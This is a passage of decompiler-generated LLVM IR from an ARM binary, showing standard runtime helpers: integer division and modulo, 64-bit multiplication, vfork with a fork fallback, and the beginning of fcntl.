  br i1 %v3_119c4, label %.thread1.thread9, label %dec_label_pc_119d0.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_119c811 = add i32 %storemerge101, 4
  %v2_119bc = icmp ugt i32 %v4_119c4, 268435455
  br i1 %v2_119bc, label %.thread, label %bb77

dec_label_pc_119d0thread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_119d0thread-pre-split.loopexit

dec_label_pc_119d0thread-pre-split.loopexit:      ; preds = %dec_label_pc_119d0thread-pre-split.loopexit.loopexit, %.thread
  %v0_119d0.pr3398 = phi i32 [ %v0_119d0.pr33.lcssa, %.thread ], [ %v0_119d0.pr33100, %dec_label_pc_119d0thread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_119d0thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_119d0thread-pre-split

dec_label_pc_119d0thread-pre-split:               ; preds = %.thread4, %dec_label_pc_119d0thread-pre-split.loopexit
  %v1_119dc39 = phi i32 [ %storemerge95, %dec_label_pc_119d0thread-pre-split.loopexit ], [ %v2_119dc, %.thread4 ]
  %v0_119d0.pr = phi i32 [ %v0_119d0.pr3398, %dec_label_pc_119d0thread-pre-split.loopexit ], [ %v3_119d8, %.thread4 ]
  br label %dec_label_pc_119d0

dec_label_pc_119d0.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_119d0

dec_label_pc_119d0:                               ; preds = %dec_label_pc_119d0.loopexit, %dec_label_pc_119d0thread-pre-split
  %v0_119e4.pr = phi i32 [ %v1_119dc39, %dec_label_pc_119d0thread-pre-split ], [ %storemerge101, %dec_label_pc_119d0.loopexit ]
  %v1_119d8 = phi i32 [ %v0_119d0.pr, %dec_label_pc_119d0thread-pre-split ], [ %v4_119c4, %dec_label_pc_119d0.loopexit ]
  %v2_119d0 = icmp slt i32 %v1_119d8, 0
  br i1 %v2_119d0, label %dec_label_pc_119e4, label %bb79

bb79:                                             ; preds = %dec_label_pc_119d0
  %v4_119d4 = icmp ult i32 %v1_119d8, %v1_119a4
  br i1 %v4_119d4, label %.thread4, label %dec_label_pc_119e4

.thread4:                                         ; preds = %bb79
  %v3_119d8 = mul i32 %v1_119d8, 2
  %v2_119dc = add i32 %v0_119e4.pr, 1
  br label %dec_label_pc_119d0thread-pre-split

dec_label_pc_119e4:                               ; preds = %bb79, %dec_label_pc_119d0
  %v2_119e4 = add i32 %v0_119e4.pr, -3
  %v5_119e8 = icmp slt i32 %v0_119e4.pr, 3
  br i1 %v5_119e8, label %dec_label_pc_11a28, label %dec_label_pc_119ec

dec_label_pc_119ec:                               ; preds = %dec_label_pc_119e4, %bb83
  %v6_11a14 = phi i32 [ %v0_11a1c, %bb83 ], [ %v2_119e4, %dec_label_pc_119e4 ]
  %v1_119f0 = phi i32 [ %v1_119f8.v6_119f8.v6_11a00.v6_11a08, %bb83 ], [ %v1_119a4, %dec_label_pc_119e4 ]
  %v3_11a1012 = phi i32 [ %v3_11a10, %bb83 ], [ %v1_119d8, %dec_label_pc_119e4 ]
  %v3_119ec = icmp ult i32 %v1_119f0, %v3_11a1012
  %v3_119f0 = select i1 %v3_119ec, i32 0, i32 %v3_11a1012
  %v1_119f8 = sub i32 %v1_119f0, %v3_119f0
  %v4_119f4 = udiv i32 %v3_11a1012, 2
  %v6_119f4 = icmp ult i32 %v1_119f8, %v4_119f4
  %v6_119f8 = select i1 %v6_119f4, i32 0, i32 %v4_119f4
  %v1_119f8.v6_119f8 = sub i32 %v1_119f8, %v6_119f8
  %.demorgan = and i1 %v3_119ec, %v6_119f4
  %v4_119fc = udiv i32 %v3_11a1012, 4
  %v6_119fc = icmp ult i32 %v1_119f8.v6_119f8, %v4_119fc
  %v6_11a00 = select i1 %v6_119fc, i32 0, i32 %v4_119fc
  %v1_119f8.v6_119f8.v6_11a00 = sub i32 %v1_119f8.v6_119f8, %v6_11a00
  %.demorgan71 = and i1 %.demorgan, %v6_119fc
  %v4_11a04 = udiv i32 %v3_11a1012, 8
  %v6_11a04 = icmp ult i32 %v1_119f8.v6_119f8.v6_11a00, %v4_11a04
  %v6_11a08 = select i1 %v6_11a04, i32 0, i32 %v4_11a04
  %v1_119f8.v6_119f8.v6_11a00.v6_11a08 = sub i32 %v1_119f8.v6_119f8.v6_11a00, %v6_11a08
  %.demorgan72 = and i1 %.demorgan71, %v6_11a04
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_119ec
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_119ec, %bb80
  %v2_11a0c = add i32 %v1_119f8.v6_119f8.v6_11a00.v6_11a08, -1
  %v4_11a0c = sub i32 0, %v1_119f8.v6_119f8.v6_11a00.v6_11a08
  %v5_11a0c = and i32 %v1_119f8.v6_119f8.v6_11a00.v6_11a08, %v4_11a0c
  %v3_11a10 = udiv i32 %v3_11a1012, 16
  %v5_11a14 = icmp slt i32 %v1_119f8.v6_119f8.v6_11a00.v6_11a08, 1
  br i1 %v5_11a14, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_11a14 = add i32 %v6_11a14, -4
  %v9_11a14 = sub i32 3, %v6_11a14
  %v10_11a14 = and i32 %v9_11a14, %v6_11a14
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_11a1c = phi i32 [ %v6_11a14, %bb81 ], [ %v7_11a14, %bb82 ]
  %v0_11a1815.in = phi i32 [ %v2_11a0c, %bb81 ], [ %v7_11a14, %bb82 ]
  %v1_11a1814.in = phi i32 [ %v5_11a0c, %bb81 ], [ %v10_11a14, %bb82 ]
  %v1_11a1814 = icmp slt i32 %v1_11a1814.in, 0
  %v0_11a1815 = icmp slt i32 %v0_11a1815.in, 0
  %v2_11a18 = xor i1 %v0_11a1815, %v1_11a1814
  br i1 %v2_11a18, label %dec_label_pc_11a1c, label %dec_label_pc_119ec

dec_label_pc_11a1c:                               ; preds = %bb83
  %v1_11a1c = urem i32 %v0_11a1c, 4
  %v2_11a1c = icmp eq i32 %v1_11a1c, 0
  br i1 %v2_11a1c, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_11a1c
  %v3_11a20 = icmp eq i32 %v1_119f8.v6_119f8.v6_11a00.v6_11a08, 0
  br i1 %v3_11a20, label %bb76, label %dec_label_pc_11a28

dec_label_pc_11a28:                               ; preds = %bb84, %dec_label_pc_119e4
  %v0_11a3c = phi i32 [ %v3_11a10, %bb84 ], [ %v1_119d8, %dec_label_pc_119e4 ]
  %v1_11a38 = phi i32 [ %v1_119f8.v6_119f8.v6_11a00.v6_11a08, %bb84 ], [ %v1_119a4, %dec_label_pc_119e4 ]
  %v0_11a28 = phi i32 [ %v0_11a1c, %bb84 ], [ %v2_119e4, %dec_label_pc_119e4 ]
  %v5_11a2c = icmp slt i32 %v0_11a28, -2
  br i1 %v5_11a2c, label %dec_label_pc_11a4c, label %dec_label_pc_11a30

dec_label_pc_11a30:                               ; preds = %dec_label_pc_11a28
  %v8_11a28 = icmp eq i32 %v0_11a28, -2
  br i1 %v8_11a28, label %dec_label_pc_11a40, label %dec_label_pc_11a34

dec_label_pc_11a34:                               ; preds = %dec_label_pc_11a30
  %v3_11a34 = icmp ult i32 %v1_11a38, %v0_11a3c
  br i1 %v3_11a34, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_11a34
  %v2_11a34 = sub i32 %v1_11a38, %v0_11a3c
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_11a34, %bb85
  %v0_11a4052 = phi i32 [ %v1_11a38, %dec_label_pc_11a34 ], [ %v2_11a34, %bb85 ]
  %v3_11a3c = udiv i32 %v0_11a3c, 2
  br label %dec_label_pc_11a40

dec_label_pc_11a40:                               ; preds = %dec_label_pc_11a30, %bb86
  %v0_11a48 = phi i32 [ %v0_11a3c, %dec_label_pc_11a30 ], [ %v3_11a3c, %bb86 ]
  %v1_11a44 = phi i32 [ %v1_11a38, %dec_label_pc_11a30 ], [ %v0_11a4052, %bb86 ]
  %v3_11a40 = icmp ult i32 %v1_11a44, %v0_11a48
  br i1 %v3_11a40, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_11a40
  %v2_11a40 = sub i32 %v1_11a44, %v0_11a48
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_11a40, %bb87
  %v0_11a4c55 = phi i32 [ %v1_11a44, %dec_label_pc_11a40 ], [ %v2_11a40, %bb87 ]
  %v3_11a48 = udiv i32 %v0_11a48, 2
  br label %dec_label_pc_11a4c

dec_label_pc_11a4c:                               ; preds = %dec_label_pc_11a28, %bb88
  %v2_11a50 = phi i32 [ %v0_11a3c, %dec_label_pc_11a28 ], [ %v3_11a48, %bb88 ]
  %v1_11a50 = phi i32 [ %v1_11a38, %dec_label_pc_11a28 ], [ %v0_11a4c55, %bb88 ]
  %v3_11a4c = icmp ult i32 %v1_11a50, %v2_11a50
  br i1 %v3_11a4c, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_11a4c
  %v2_11a4c = sub i32 %v1_11a50, %v2_11a50
  br label %bb76

dec_label_pc_11a58:                               ; preds = %entry
  %v0_11a58 = load i32, i32* @lr, align 4
  %v0_11a5c = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_11a58)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_11a50, { 1, 2, 0 }
  uselistorder i32 %v0_11a3c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_11a1c, { 1, 0, 2 }
  uselistorder i32 %v7_11a14, { 1, 0 }
  uselistorder i32 %v3_11a10, { 1, 0 }
  uselistorder i32 %v1_119f8.v6_119f8.v6_11a00.v6_11a08, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_11a04, { 1, 0 }
  uselistorder i32 %v4_119fc, { 1, 0 }
  uselistorder i32 %v4_119f4, { 1, 0 }
  uselistorder i32 %v6_11a14, { 3, 0, 2, 1 }
  uselistorder i32 %v2_119e4, { 1, 0 }
  uselistorder i32 %v1_119d8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_119c4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_119d0.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_119a4, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_11a4c, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_11a40, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_119ec, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_11a68 = icmp eq i32 %arg2, 0
  br i1 %v2_11a68, label %dec_label_pc_11b3c, label %dec_label_pc_11a70

dec_label_pc_11a70:                               ; preds = %entry
  %v1_11a68 = icmp slt i32 %arg2, 0
  br i1 %v1_11a68, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_11a70
  %v2_11a70 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_11a70, %bb
  %v4_11a88 = phi i32 [ %arg2, %dec_label_pc_11a70 ], [ %v2_11a70, %bb ]
  %v0_11a74 = load i32, i32* @r0, align 4
  %v1_11a74 = icmp slt i32 %v0_11a74, 0
  br i1 %v1_11a74, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_11a78 = sub i32 0, %v0_11a74
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_11a80 = phi i32 [ %v0_11a74, %bb79 ], [ %v2_11a78, %bb80 ]
  %v1_11a7c = add i32 %v4_11a88, -1
  %v7_11a7c = icmp eq i32 %v4_11a88, 1
  br i1 %v7_11a7c, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_11a80 = icmp eq i32 %v1_11a80, %v4_11a88
  br i1 %v10_11a80, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_11a80 = icmp ult i32 %v1_11a80, %v4_11a88
  br i1 %v4_11a80, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_11a88 = and i32 %v1_11a7c, %v4_11a88
  %v8_11a88 = icmp eq i32 %v6_11a88, 0
  br i1 %v8_11a88, label %.thread72, label %dec_label_pc_11a98.preheader

dec_label_pc_11a98.preheader:                     ; preds = %bb84
  %v2_11a98109 = icmp ugt i32 %v4_11a88, 268435455
  br i1 %v2_11a98109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_11a8c64 = phi i32 [ %v1_11a80, %bb84 ], [ 0, %.thread70 ]
  %v3_11a8c = and i32 %v1_11a8c64, %v1_11a7c
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_11a98.preheader
  %v0_11aac.pr35.lcssa = phi i32 [ %v4_11a88, %dec_label_pc_11a98.preheader ], [ %v4_11aa0, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_11a98.preheader ], [ %v2_11aa49, %.thread2.thread7 ]
  br label %dec_label_pc_11aacthread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_11a98.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_11aa49, %.thread2.thread7 ], [ 0, %dec_label_pc_11a98.preheader ]
  %v0_11aac.pr35110 = phi i32 [ %v4_11aa0, %.thread2.thread7 ], [ %v4_11a88, %dec_label_pc_11a98.preheader ]
  %v4_11a9c = icmp ult i32 %v0_11aac.pr35110, %v1_11a80
  br i1 %v4_11a9c, label %bb86, label %dec_label_pc_11aacthread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_11aa0 = and i32 %v0_11aac.pr35110, 268435456
  %v3_11aa0 = icmp eq i32 %v2_11aa0, 0
  %v4_11aa0 = mul i32 %v0_11aac.pr35110, 16
  br i1 %v3_11aa0, label %.thread2.thread7, label %dec_label_pc_11aac.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_11aa49 = add i32 %storemerge111, 4
  %v2_11a98 = icmp ugt i32 %v4_11aa0, 268435455
  br i1 %v2_11a98, label %.thread1, label %bb85

dec_label_pc_11aacthread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_11aacthread-pre-split.loopexit

dec_label_pc_11aacthread-pre-split.loopexit:      ; preds = %dec_label_pc_11aacthread-pre-split.loopexit.loopexit, %.thread1
  %v0_11aac.pr35108 = phi i32 [ %v0_11aac.pr35.lcssa, %.thread1 ], [ %v0_11aac.pr35110, %dec_label_pc_11aacthread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_11aacthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_11aacthread-pre-split

dec_label_pc_11aacthread-pre-split:               ; preds = %.thread4, %dec_label_pc_11aacthread-pre-split.loopexit
  %v1_11ab841 = phi i32 [ %storemerge105, %dec_label_pc_11aacthread-pre-split.loopexit ], [ %v2_11ab8, %.thread4 ]
  %v2_11ab036 = phi i32 [ %v1_11a80, %dec_label_pc_11aacthread-pre-split.loopexit ], [ %v2_11ab0, %.thread4 ]
  %v0_11aac.pr = phi i32 [ %v0_11aac.pr35108, %dec_label_pc_11aacthread-pre-split.loopexit ], [ %v3_11ab4, %.thread4 ]
  br label %dec_label_pc_11aac

dec_label_pc_11aac.loopexit:                      ; preds = %bb86
  br label %dec_label_pc_11aac

dec_label_pc_11aac:                               ; preds = %dec_label_pc_11aac.loopexit, %dec_label_pc_11aacthread-pre-split
  %v0_11ac0.pr = phi i32 [ %v1_11ab841, %dec_label_pc_11aacthread-pre-split ], [ %storemerge111, %dec_label_pc_11aac.loopexit ]
  %v2_11ab0 = phi i32 [ %v2_11ab036, %dec_label_pc_11aacthread-pre-split ], [ %v1_11a80, %dec_label_pc_11aac.loopexit ]
  %v1_11ab4 = phi i32 [ %v0_11aac.pr, %dec_label_pc_11aacthread-pre-split ], [ %v4_11aa0, %dec_label_pc_11aac.loopexit ]
  %v2_11aac = icmp slt i32 %v1_11ab4, 0
  br i1 %v2_11aac, label %dec_label_pc_11ac0, label %bb87

bb87:                                             ; preds = %dec_label_pc_11aac
  %v4_11ab0 = icmp ult i32 %v1_11ab4, %v2_11ab0
  br i1 %v4_11ab0, label %.thread4, label %dec_label_pc_11ac0

.thread4:                                         ; preds = %bb87
  %v3_11ab4 = mul i32 %v1_11ab4, 2
  %v2_11ab8 = add i32 %v0_11ac0.pr, 1
  br label %dec_label_pc_11aacthread-pre-split

dec_label_pc_11ac0:                               ; preds = %bb87, %dec_label_pc_11aac
  %v2_11ac0 = add i32 %v0_11ac0.pr, -3
  %v5_11ac4 = icmp slt i32 %v0_11ac0.pr, 3
  br i1 %v5_11ac4, label %dec_label_pc_11b04, label %dec_label_pc_11ac8

dec_label_pc_11ac8:                               ; preds = %dec_label_pc_11ac0, %bb91
  %v6_11af0 = phi i32 [ %v0_11af8, %bb91 ], [ %v2_11ac0, %dec_label_pc_11ac0 ]
  %v1_11acc = phi i32 [ %v1_11ad4.v6_11ad4.v6_11adc.v6_11ae4, %bb91 ], [ %v2_11ab0, %dec_label_pc_11ac0 ]
  %v3_11aec10 = phi i32 [ %v3_11aec, %bb91 ], [ %v1_11ab4, %dec_label_pc_11ac0 ]
  %v3_11ac8 = icmp ult i32 %v1_11acc, %v3_11aec10
  %v3_11acc = select i1 %v3_11ac8, i32 0, i32 %v3_11aec10
  %v1_11ad4 = sub i32 %v1_11acc, %v3_11acc
  %v4_11ad0 = udiv i32 %v3_11aec10, 2
  %v6_11ad0 = icmp ult i32 %v1_11ad4, %v4_11ad0
  %v6_11ad4 = select i1 %v6_11ad0, i32 0, i32 %v4_11ad0
  %v1_11ad4.v6_11ad4 = sub i32 %v1_11ad4, %v6_11ad4
  %.demorgan = and i1 %v3_11ac8, %v6_11ad0
  %v4_11ad8 = udiv i32 %v3_11aec10, 4
  %v6_11ad8 = icmp ult i32 %v1_11ad4.v6_11ad4, %v4_11ad8
  %v6_11adc = select i1 %v6_11ad8, i32 0, i32 %v4_11ad8
  %v1_11ad4.v6_11ad4.v6_11adc = sub i32 %v1_11ad4.v6_11ad4, %v6_11adc
  %.demorgan76 = and i1 %.demorgan, %v6_11ad8
  %v4_11ae0 = udiv i32 %v3_11aec10, 8
  %v6_11ae0 = icmp ult i32 %v1_11ad4.v6_11ad4.v6_11adc, %v4_11ae0
  %v6_11ae4 = select i1 %v6_11ae0, i32 0, i32 %v4_11ae0
  %v1_11ad4.v6_11ad4.v6_11adc.v6_11ae4 = sub i32 %v1_11ad4.v6_11ad4.v6_11adc, %v6_11ae4
  %.demorgan77 = and i1 %.demorgan76, %v6_11ae0
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_11ac8
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_11ac8, %bb88
  %v2_11ae8 = add i32 %v1_11ad4.v6_11ad4.v6_11adc.v6_11ae4, -1
  %v4_11ae8 = sub i32 0, %v1_11ad4.v6_11ad4.v6_11adc.v6_11ae4
  %v5_11ae8 = and i32 %v1_11ad4.v6_11ad4.v6_11adc.v6_11ae4, %v4_11ae8
  %v3_11aec = udiv i32 %v3_11aec10, 16
  %v5_11af0 = icmp slt i32 %v1_11ad4.v6_11ad4.v6_11adc.v6_11ae4, 1
  br i1 %v5_11af0, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_11af0 = add i32 %v6_11af0, -4
  %v9_11af0 = sub i32 3, %v6_11af0
  %v10_11af0 = and i32 %v9_11af0, %v6_11af0
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_11af8 = phi i32 [ %v6_11af0, %bb89 ], [ %v7_11af0, %bb90 ]
  %v0_11af413.in = phi i32 [ %v2_11ae8, %bb89 ], [ %v7_11af0, %bb90 ]
  %v1_11af412.in = phi i32 [ %v5_11ae8, %bb89 ], [ %v10_11af0, %bb90 ]
  %v1_11af412 = icmp slt i32 %v1_11af412.in, 0
  %v0_11af413 = icmp slt i32 %v0_11af413.in, 0
  %v2_11af4 = xor i1 %v0_11af413, %v1_11af412
  br i1 %v2_11af4, label %dec_label_pc_11af8, label %dec_label_pc_11ac8

dec_label_pc_11af8:                               ; preds = %bb91
  %v1_11af8 = urem i32 %v0_11af8, 4
  %v2_11af8 = icmp eq i32 %v1_11af8, 0
  br i1 %v2_11af8, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_11af8
  %v3_11afc = icmp eq i32 %v1_11ad4.v6_11ad4.v6_11adc.v6_11ae4, 0
  br i1 %v3_11afc, label %.thread6, label %dec_label_pc_11b04

dec_label_pc_11b04:                               ; preds = %bb92, %dec_label_pc_11ac0
  %v0_11b18 = phi i32 [ %v3_11aec, %bb92 ], [ %v1_11ab4, %dec_label_pc_11ac0 ]
  %v1_11b14 = phi i32 [ %v1_11ad4.v6_11ad4.v6_11adc.v6_11ae4, %bb92 ], [ %v2_11ab0, %dec_label_pc_11ac0 ]
  %v0_11b04 = phi i32 [ %v0_11af8, %bb92 ], [ %v2_11ac0, %dec_label_pc_11ac0 ]
  %v5_11b08 = icmp slt i32 %v0_11b04, -2
  br i1 %v5_11b08, label %dec_label_pc_11b28, label %dec_label_pc_11b0c

dec_label_pc_11b0c:                               ; preds = %dec_label_pc_11b04
  %v8_11b04 = icmp eq i32 %v0_11b04, -2
  br i1 %v8_11b04, label %dec_label_pc_11b1c, label %dec_label_pc_11b10

dec_label_pc_11b10:                               ; preds = %dec_label_pc_11b0c
  %v3_11b10 = icmp ult i32 %v1_11b14, %v0_11b18
  br i1 %v3_11b10, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_11b10
  %v2_11b10 = sub i32 %v1_11b14, %v0_11b18
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_11b10, %bb93
  %v0_11b1c54 = phi i32 [ %v1_11b14, %dec_label_pc_11b10 ], [ %v2_11b10, %bb93 ]
  %v3_11b18 = udiv i32 %v0_11b18, 2
  br label %dec_label_pc_11b1c

dec_label_pc_11b1c:                               ; preds = %dec_label_pc_11b0c, %bb94
  %v0_11b24 = phi i32 [ %v0_11b18, %dec_label_pc_11b0c ], [ %v3_11b18, %bb94 ]
  %v1_11b20 = phi i32 [ %v1_11b14, %dec_label_pc_11b0c ], [ %v0_11b1c54, %bb94 ]
  %v3_11b1c = icmp ult i32 %v1_11b20, %v0_11b24
  br i1 %v3_11b1c, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_11b1c
  %v2_11b1c = sub i32 %v1_11b20, %v0_11b24
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_11b1c, %bb95
  %v0_11b2857 = phi i32 [ %v1_11b20, %dec_label_pc_11b1c ], [ %v2_11b1c, %bb95 ]
  %v3_11b24 = udiv i32 %v0_11b24, 2
  br label %dec_label_pc_11b28

dec_label_pc_11b28:                               ; preds = %dec_label_pc_11b04, %bb96
  %v2_11b2c = phi i32 [ %v0_11b18, %dec_label_pc_11b04 ], [ %v3_11b24, %bb96 ]
  %v1_11b2c = phi i32 [ %v1_11b14, %dec_label_pc_11b04 ], [ %v0_11b2857, %bb96 ]
  %v3_11b28 = icmp ult i32 %v1_11b2c, %v2_11b2c
  br i1 %v3_11b28, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_11b28
  %v2_11b28 = sub i32 %v1_11b2c, %v2_11b2c
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_11b28, %bb83, %.thread72, %dec_label_pc_11af8, %bb92, %bb97
  %v1_11b34 = phi i32 [ %v1_11ad4.v6_11ad4.v6_11adc.v6_11ae4, %dec_label_pc_11af8 ], [ 0, %bb92 ], [ %v1_11b2c, %dec_label_pc_11b28 ], [ %v2_11b28, %bb97 ], [ %v3_11a8c, %.thread72 ], [ %v1_11a80, %bb83 ]
  br i1 %v1_11a74, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_11b34 = sub i32 0, %v1_11b34
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_11b38 = phi i32 [ %v1_11b34, %.thread6 ], [ %v2_11b34, %bb98 ]
  ret i32 %v1_11b38

dec_label_pc_11b3c:                               ; preds = %entry
  %v0_11b3c = load i32, i32* @lr, align 4
  %v0_11b40 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_11b3c)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_11b18, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_11af8, { 1, 0, 2 }
  uselistorder i32 %v7_11af0, { 1, 0 }
  uselistorder i32 %v3_11aec, { 1, 0 }
  uselistorder i32 %v1_11ad4.v6_11ad4.v6_11adc.v6_11ae4, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_11ae0, { 1, 0 }
  uselistorder i32 %v4_11ad8, { 1, 0 }
  uselistorder i32 %v4_11ad0, { 1, 0 }
  uselistorder i32 %v6_11af0, { 3, 0, 2, 1 }
  uselistorder i32 %v2_11ac0, { 1, 0 }
  uselistorder i32 %v1_11ab4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_11ab0, { 1, 0, 3, 2 }
  uselistorder i32 %v4_11aa0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_11aac.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11a80, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_11a88, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_11b28, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_11b1c, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_11ac8, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_11b4c = load i32, i32* @r0, align 4
  ret i32 %v1_11b4c
}

define i32 @__muldi3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_11b5c = udiv i32 %arg1, 65536
  %v3_11b60 = udiv i32 %arg3, 65536
  %tmp = mul i32 %v3_11b5c, -65536
  %v5_11b64 = add i32 %tmp, -1
  %v6_11b64 = and i32 %v5_11b64, %arg1
  %tmp10 = mul i32 %v3_11b60, -65536
  %v5_11b68 = add i32 %tmp10, -1
  %v6_11b68 = and i32 %v5_11b68, %arg3
  %v2_11b6c = mul i32 %v6_11b68, %v6_11b64
  %v2_11b70 = mul i32 %v6_11b68, %v3_11b5c
  %v2_11b74 = mul i32 %v6_11b64, %v3_11b60
  %v2_11b7c = add i32 %v2_11b70, %v2_11b74
  %v3_11b7c = icmp ult i32 %v2_11b7c, %v2_11b70
  br i1 %v3_11b7c, label %bb, label %bb9

bb:                                               ; preds = %entry
  br label %bb9

bb9:                                              ; preds = %entry, %bb
  %v4_11b84 = mul i32 %v2_11b7c, 65536
  %v5_11b84 = add i32 %v4_11b84, %v2_11b6c
  ret i32 %v5_11b84

; uselistorder directives
  uselistorder i32 %v2_11b70, { 1, 0 }
  uselistorder i32 %v6_11b64, { 1, 0 }
  uselistorder i32 %v3_11b60, { 1, 0 }
  uselistorder i32 %v3_11b5c, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_11ba0 = call i32 @vfork()
  store i32 %v0_11ba0, i32* @r0, align 4
  %v2_11ba4 = icmp ugt i32 %v0_11ba0, -4097
  br i1 %v2_11ba4, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_11bb8, %entry
  %merge = phi i32 [ %v0_11ba0, %entry ], [ %v0_11bb8, %dec_label_pc_11bb8 ]
  ret i32 %merge

bb1:                                              ; preds = %entry
  %v4_11bb0 = icmp eq i32 %v0_11ba0, -38
  br i1 %v4_11bb0, label %dec_label_pc_11bb8, label %bb2

dec_label_pc_11bb8:                               ; preds = %bb1
  %v0_11bb8 = call i32 @fork()
  store i32 %v0_11bb8, i32* @r0, align 4
  %v2_11bbc = icmp ugt i32 %v0_11bb8, -4097
  br i1 %v2_11bbc, label %bb2, label %bb

bb2:                                              ; preds = %bb1, %dec_label_pc_11bb8
  %v0_11bc4 = call i32 @__syscall_error()
  ret i32 %v0_11bc4

; uselistorder directives
  uselistorder i32 %v0_11bb8, { 1, 2, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_11bd0 = load i32, i32* @r2, align 4
  %v1_11be0 = add i32 %arg2, -12
  store i32 %v6_11bd0, i32* @r3, align 4
